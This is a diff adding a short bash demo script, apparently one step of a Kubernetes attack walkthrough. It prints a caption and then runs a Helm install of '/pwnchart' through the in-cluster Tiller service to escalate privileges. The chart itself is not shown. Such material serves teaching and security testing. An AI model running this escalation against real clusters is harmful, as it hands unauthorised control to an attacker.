@@ -1,0 +1,7 @@
+#!/usr/bin/env bash
+
+printf "Use Helm to deploy a chart to elevate our privilege access\n"
+printf "Command: \"helm --host tiller-deploy.kube-system:44134 install /pwnchart\" \n"
+printf " \n"
+sleep 3
+helm --host tiller-deploy.kube-system:44134 install /pwnchart
